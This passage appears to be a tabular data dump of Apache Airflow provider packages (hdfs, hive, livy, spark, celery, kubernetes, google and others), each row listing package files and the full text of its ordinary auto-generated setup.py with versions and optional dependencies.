    """"""Perform the package apache-airflow-providers-apache-hdfs setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(
            include=['airflow.providers.apache.hdfs', 'airflow.providers.apache.hdfs.*']
        ),
    )

if __name__ == ""__main__"":
    do_setup()
",0
apache-airflow-providers-apache-hive-4.0.0,0,1,1,1,1,0,0,0,get_provider_info.py hive.py __init__.py hive.py hive_stats.py __init__.py hive_partition.py metastore_partition.py named_hive_partition.py __init__.py hive_to_mysql.py hive_to_samba.py mssql_to_hive.py mysql_to_hive.py s3_to_hive.py vertica_to_hive.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-apache-hive package.""""""

from setuptools import find_namespace_packages, setup

version = '4.0.0'

def do_setup():
    """"""Perform the package apache-airflow-providers-apache-hive setup.""""""
    setup(
        version=version,
        extras_require={
            'amazon': ['apache-airflow-providers-amazon'],
            'common.sql': ['apache-airflow-providers-common-sql'],
            'microsoft.mssql': ['apache-airflow-providers-microsoft-mssql'],
            'mysql': ['apache-airflow-providers-mysql'],
            'presto': ['apache-airflow-providers-presto'],
            'samba': ['apache-airflow-providers-samba'],
            'vertica': ['apache-airflow-providers-vertica'],
        },
        packages=find_namespace_packages(
            include=['airflow.providers.apache.hive', 'airflow.providers.apache.hive.*']
        ),
    )

if __name__ == ""__main__"":
    do_setup()
",0
apache-airflow-providers-apache-livy-3.1.0,0,1,1,1,1,0,0,0,get_provider_info.py livy.py __init__.py livy.py __init__.py livy.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-apache-livy package.""""""

from setuptools import find_namespace_packages, setup

version = '3.1.0'

def do_setup():
    """"""Perform the package apache-airflow-providers-apache-livy setup.""""""
    setup(
        version=version,
        extras_require={'http': ['apache-airflow-providers-http']},
        packages=find_namespace_packages(
            include=['airflow.providers.apache.livy', 'airflow.providers.apache.livy.*']
        ),
    )

if __name__ == ""__main__"":
    do_setup()
",0
apache-airflow-providers-apache-spark-3.0.0,0,1,1,1,1,0,0,0,get_provider_info.py spark_jdbc.py spark_jdbc_script.py spark_sql.py spark_submit.py __init__.py spark_jdbc.py spark_sql.py spark_submit.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-apache-spark package.""""""

from setuptools import find_namespace_packages, setup

version = '3.0.0'

def do_setup():
    """"""Perform the package apache-airflow-providers-apache-spark setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(
            include=['airflow.providers.apache.spark', 'airflow.providers.apache.spark.*']
        ),
    )

if __name__ == ""__main__"":
    do_setup()
",0
apache-airflow-providers-celery-3.0.0,0,1,1,1,1,0,0,0,get_provider_info.py celery_queue.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-celery package.""""""

from setuptools import find_namespace_packages, setup

version = '3.0.0'

def do_setup():
    """"""Perform the package apache-airflow-providers-celery setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(include=['airflow.providers.celery', 'airflow.providers.celery.*']),
    )

if __name__ == ""__main__"":
    do_setup()
",0
apache-airflow-providers-cncf-kubernetes-4.2.0,0,1,1,1,1,0,0,0,backwards_compat_converters.py pod.py pod_runtime_info_env.py volume.py volume_mount.py __init__.py get_provider_info.py kubernetes.py __init__.py kubernetes_pod.py spark_kubernetes.py __init__.py spark_kubernetes.py __init__.py pod_manager.py xcom_sidecar.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-cncf-kubernetes package.""""""

from setuptools import find_namespace_packages, setup

version = '4.2.0'


def do_setup():
    """"""Perform the package apache-airflow-providers-cncf-kubernetes setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(
            include=['airflow.providers.cncf.kubernetes', 'airflow.providers.cncf.kubernetes.*']
        ),
    )


if __name__ == ""__main__"":
    do_setup()
",0
apache-airflow-providers-common-sql-1.0.0,0,1,1,1,1,0,0,0,get_provider_info.py sql.py __init__.py sql.py __init__.py sql.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-common-sql package.""""""

from setuptools import find_namespace_packages, setup

version = '1.0.0'


def do_setup():
    """"""Perform the package apache-airflow-providers-common-sql setup.""""""
    setup(
        version=version,
        extras_require={'pandas': ['pandas>=0.17.1']},
        packages=find_namespace_packages(
            include=['airflow.providers.common.sql', 'airflow.providers.common.sql.*']
        ),
    )


if __name__ == ""__main__"":
    do_setup()
",0
apache-airflow-providers-databricks-3.1.0,0,1,1,1,1,0,0,0,get_provider_info.py databricks.py databricks_base.py databricks_sql.py __init__.py databricks.py databricks_repos.py databricks_sql.py __init__.py databricks.py __init__.py databricks.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-databricks package.""""""

from setuptools import find_namespace_packages, setup

version = '3.1.0'


def do_setup():
    """"""Perform the package apache-airflow-providers-databricks setup.""""""
    setup(
        version=version,
        extras_require={'common.sql': ['apache-airflow-providers-common-sql']},
        packages=find_namespace_packages(
            include=['airflow.providers.databricks', 'airflow.providers.databricks.*']
        ),
    )


if __name__ == ""__main__"":
    do_setup()
",0
apache-airflow-providers-datadog-3.0.0,0,1,1,1,1,0,0,0,get_provider_info.py datadog.py __init__.py datadog.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-datadog package.""""""

from setuptools import find_namespace_packages, setup

version = '3.0.0'

def do_setup():
    """"""Perform the package apache-airflow-providers-datadog setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(
            include=['airflow.providers.datadog', 'airflow.providers.datadog.*']
        ),
    )

if __name__ == ""__main__"":
    do_setup()
",0
apache-airflow-providers-dbt-cloud-2.1.0,0,1,1,1,1,0,0,0,get_provider_info.py dbt.py __init__.py dbt.py __init__.py dbt.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-dbt-cloud package.""""""

from setuptools import find_namespace_packages, setup

version = '2.1.0'

def do_setup():
    """"""Perform the package apache-airflow-providers-dbt-cloud setup.""""""
    setup(
        version=version,
        extras_require={'http': ['apache-airflow-providers-http']},
        packages=find_namespace_packages(
            include=['airflow.providers.dbt.cloud', 'airflow.providers.dbt.cloud.*']
        ),
    )

if __name__ == ""__main__"":
    do_setup()
",0
apache-airflow-providers-docker-3.1.0,0,1,1,1,1,0,0,0,docker.py __init__.py get_provider_info.py docker.py __init__.py docker.py docker_swarm.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-docker package.""""""

from setuptools import find_namespace_packages, setup

version = '3.1.0'


def do_setup():
    """"""Perform the package apache-airflow-providers-docker setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(include=['airflow.providers.docker', 'airflow.providers.docker.*']),
    )


if __name__ == ""__main__"":
    do_setup()
",0
apache-airflow-providers-ftp-3.1.0,0,1,1,1,1,0,0,0,get_provider_info.py ftp.py __init__.py ftp.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-ftp package.""""""

from setuptools import find_namespace_packages, setup

version = '3.1.0'


def do_setup():
    """"""Perform the package apache-airflow-providers-ftp setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(include=['airflow.providers.ftp', 'airflow.providers.ftp.*']),
    )


if __name__ == ""__main__"":
    do_setup()
",0
apache-airflow-providers-google-8.2.0,0,1,1,1,1,0,0,0,ads.py __init__.py ads.py __init__.py ads_to_gcs.py __init__.py __init__.py example_automl_nl_text_classification.py example_automl_nl_text_extraction.py example_automl_nl_text_sentiment.py example_automl_tables.py example_automl_translation.py example_automl_video_intelligence_classification.py example_automl_video_intelligence_tracking.py example_automl_vision_classification.py example_automl_vision_object_detection.py example_bigquery_dts.py example_bigquery_to_bigquery.py example_bigquery_to_mssql.py example_bigtable.py example_cloud_build.py example_cloud_build.yaml example_cloud_composer.py example_cloud_memorystore.py example_cloud_sql_query.py example_cloud_storage_transfer_service_aws.py example_cloud_storage_transfer_service_gcp.py example_compute.py example_compute_igm.py example_compute_ssh.py example_dataflow.py example_dataflow_flex_template.py example_dataflow_sql.py example_datafusion.py example_dataplex.py example_dataprep.py example_dataproc_metastore.py example_dlp.py example_facebook_ads_to_gcs.py example_functions.py example_gcs_to_sftp.py example_gdrive_to_gcs.py example_gdrive_to_local.py example_life_sciences.py example_looker.py example_mlengine.py example_natural_language.py example_postgres_to_gcs.py example_presto_to_gcs.py example_salesforce_to_gcs.py example_sftp_to_gcs.py example_translate.py example_translate_speech.py example_trino_to_gcs.py example_vertex_ai.py example_video_intelligence.py example_vision.py __init__.py automl.py bigquery.py bigquery_dts.py bigtable.py cloud_build.py cloud_composer.py cloud_memorystore.py cloud_sql.py cloud_storage_transfer_service.py compute.py compute_ssh.py datacatalog.py dataflow.py datafusion.py dataplex.py dataprep.py dataproc.py dataproc_metastore.py datastore.py dlp.py functions.py gcs.py gdm.py kms.py kubernetes_engine.py life_sciences.py looker.py mlengine.py natural_language.py os_login.py pubsub.py secret_manager.py spanner.py speech_to_text.py stackdriver.py tasks.py text_to_speech.py translate.py auto_ml.py batch_prediction_job.py custom_job.py dataset.py endpoint_service.py hyperparameter_tuning_job.py model_service.py __init__.py video_intelligence.py vision.py workflows.py __init__.py base.py bigquery.py bigquery_dts.py bigtable.py cloud_sql.py cloud_tasks.py datacatalog.py dataflow.py dataplex.py dataproc.py datastore.py kubernetes_engine.py pubsub.py spanner.py stackdriver.py vertex_ai.py workflows.py __init__.py gcs_task_handler.py stackdriver_task_handler.py __init__.py automl.py bigquery.py bigquery_dts.py bigtable.py cloud_build.py cloud_composer.py cloud_memorystore.py cloud_sql.py cloud_storage_transfer_service.py compute.py datacatalog.py dataflow.py datafusion.py dataplex.py dataprep.py dataproc.py dataproc_metastore.py datastore.py dlp.py functions.py gcs.py kubernetes_engine.py life_sciences.py looker.py mlengine.py natural_language.py pubsub.py spanner.py speech_to_text.py stackdriver.py tasks.py text_to_speech.py translate.py translate_speech.py auto_ml.py batch_prediction_job.py custom_job.py dataset.py endpoint_service.py hyperparameter_tuning_job.py model_service.py __init__.py video_intelligence.py vision.py workflows.py __init__.py secret_manager.py __init__.py bigquery.py bigquery_dts.py bigtable.py cloud_storage_transfer_service.py dataflow.py datafusion.py dataplex.py dataproc.py gcs.py looker.py pubsub.py workflows.py __init__.py adls_to_gcs.py azure_fileshare_to_gcs.py bigquery_to_bigquery.py bigquery_to_gcs.py bigquery_to_mssql.py bigquery_to_mysql.py calendar_to_gcs.py cassandra_to_gcs.py facebook_ads_to_gcs.py gcs_to_bigquery.py gcs_to_gcs.py gcs_to_local.py gcs_to_sftp.py gdrive_to_gcs.py gdrive_to_local.py local_to_gcs.py mssql_to_gcs.py mysql_to_gcs.py oracle_to_gcs.py postgres_to_gcs.py presto_to_gcs.py s3_to_gcs.py salesforce_to_gcs.py sftp_to_gcs.py sheets_to_gcs.py sql_to_gcs.py trino_to_gcs.py __init__.py cloud_composer.py __init__.py bigquery_get_data.py credentials_provider.py field_sanitizer.py field_validator.py helpers.py mlengine_operator_utils.py mlengine_prediction_summary.py __init__.py secret_manager_client.py __init__.py __init__.py google_openid.py __init__.py consts.py base_google.py discovery_api.py __init__.py storage.py __init__.py id_token_credentials.py __init__.py __init__.py __init__.py firestore.py __init__.py firestore.py __init__.py __init__.py get_provider_info.py go_module_utils.py leveldb.py __init__.py leveldb.py __init__.py __init__.py example_analytics.py example_campaign_manager.py example_display_video.py __init__.py analytics.py campaign_manager.py display_video.py search_ads.py __init__.py analytics.py campaign_manager.py display_video.py search_ads.py __init__.py campaign_manager.py display_video.py search_ads.py __init__.py __init__.py example_local_to_drive.py __init__.py calendar.py drive.py sheets.py __init__.py sheets.py __init__.py drive.py __init__.py gcs_to_gdrive.py gcs_to_sheets.py local_to_drive.py sql_to_sheets.py __init__.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-google package.""""""

from setuptools import find_namespace_packages, setup

version = '8.2.0'


def do_setup():
    """"""Perform the package apache-airflow-providers-google setup.""""""
    setup(
        version=version,
        extras_require={
            'amazon': ['apache-airflow-providers-amazon>=2.6.0'],
            'apache.beam': ['apache-airflow-providers-apache-beam', 'apache-beam[gcp]'],
            'apache.cassandra': ['apache-airflow-providers-apache-cassandra'],
            'cncf.kubernetes': ['apache-airflow-providers-cncf-kubernetes'],
            'common.sql': ['apache-airflow-providers-common-sql'],
            'facebook': ['apache-airflow-providers-facebook>=2.2.0'],
            'microsoft.azure': ['apache-airflow-providers-microsoft-azure'],
            'microsoft.mssql': ['apache-airflow-providers-microsoft-mssql'],
            'mysql': ['apache-airflow-providers-mysql'],
            'oracle': ['apache-airflow-providers-oracle>=3.1.0'],
            'postgres': ['apache-airflow-providers-postgres'],
            'presto': ['apache-airflow-providers-presto'],
            'salesforce': ['apache-airflow-providers-salesforce'],
            'sftp': ['apache-airflow-providers-sftp'],
            'ssh': ['apache-airflow-providers-ssh'],
            'trino': ['apache-airflow-providers-trino'],
            'leveldb': ['plyvel'],
        },
        packages=find_namespace_packages(include=['airflow.providers.google', 'airflow.providers.google.*']),
    )


if __name__ == ""__main__"":
    do_setup()
",0
apache-airflow-providers-http-4.0.0,0,1,1,1,1,0,0,0,get_provider_info.py http.py __init__.py http.py __init__.py http.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-http package.""""""

from setuptools import find_namespace_packages, setup

version = '4.0.0'


def do_setup():
    """"""Perform the package apache-airflow-providers-http setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(include=['airflow.providers.http', 'airflow.providers.http.*']),
    )


if __name__ == ""__main__"":
    do_setup()
",0
apache-airflow-providers-imap-3.0.0,0,1,1,1,1,0,0,0,get_provider_info.py imap.py __init__.py imap_attachment.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-imap package.""""""

from setuptools import find_namespace_packages, setup

version = '3.0.0'

def do_setup():
    """"""Perform the package apache-airflow-providers-imap setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(include=['airflow.providers.imap', 'airflow.providers.imap.*']),
    )

if __name__ == ""__main__"":
    do_setup()
",0
apache-airflow-providers-jdbc-3.2.0,0,1,1,1,1,0,0,0,get_provider_info.py jdbc.py __init__.py jdbc.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
